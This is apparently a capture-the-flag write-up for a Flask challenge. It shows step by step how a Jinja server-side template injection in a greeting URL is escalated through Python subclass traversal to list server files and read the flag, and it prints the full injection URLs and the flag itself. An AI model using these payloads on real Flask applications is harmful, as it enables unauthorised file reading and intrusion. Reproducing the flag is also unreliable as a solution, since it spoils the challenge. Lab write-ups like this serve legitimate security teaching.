# Just Cat The Flask 1/2

### Text: https://bluehens-cat-the-flask.chals.io/greeting/hi

Try this link if above is down again.

https://bluehens-cat-the-flask-patched.chals.io/greeting/hi

-ProfNinja and DaveTheDaemonSlayer

&nbsp;

Score: 100

## Writeup

In this challenge you are given a link to a vulnerable website. When you first go to the link you are given a friendly greeting

```
Welcome hi!
```

When going to the base url https://bluehens-cat-the-flask.chals.io/ you are given a usage message.

```
USAGE: /greeting/:name
```

So whatever you put in the url will be displayed as text. We know that the server is running on Flask. Flask uses the Jinja library to render templates. We can check this by entering {{1+1}} in the url. 

```
Welcome 2!
```

You can see that we got the output 2. Great we know that the website is vulnerable to a url injection. From the description of the challenge we are most likely going to have to print out the flag on the system. The challenge is now how do we execute a shell command here. Unfortunately you cannot import libraries and call python functions inside of the template... or can you. One thing that we can input into the template is a string. In python a string is an object which means that we can access the class of the string. From there we can get the base class of the string class which is the object class. From this we can access any class using the \_\_subclasses\_\_ method. 

Command to see all classes we have access to
```
'abc'.__class__.__base__.__subclasses__() 
```

Output
```
Welcome [<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>, <class 'mappingproxy'>, <class 'generator'>...
```

Now that we have all of the classes we just need to find one that can read in a file. One of these is the IOBase class. This class contains the FileIO class which we can use to read out a file.

```
'abc'.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0]('flag.txt').read()
```

Unfortunately this does not work and we get the error

```
FileNotFoundError
FileNotFoundError: [Errno 2] No such file or directory: 'flag.txt'
```

We have found another problem that we have to find the flag first. Using the same method described one way to print out a directory is with using the os module. One class that we have access to that contains the sys module is the warnings.catch_warnings class. Now we just need to find where the sys package is.

```
https://bluehens-cat-the-flask.chals.io/greeting/%7B%7B'abc'.__class__.__base__.__subclasses__()[222].__init__.__globals__['sys'].modules['os'].listdir()%7D%7D
```

```
Hi ['sum_suckers_creds', 'flag1.txt', 'requirements.txt', 'chall.py']!
```

All we have to do now is to use the previous input to read in the flag.

```
https://bluehens-cat-the-flask.chals.io/greeting/%7B%7B'abc'.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0]('flag1.txt').read()%7D%7D
```
```
Hello b'UDCTF{l4y3r_1_c0mpl3t3_g00d_luck_w1th_p4rt_2}\n'!
```


## Flag: UDCTF{l4y3r_1_c0mpl3t3_g00d_luck_w1th_p4rt_2}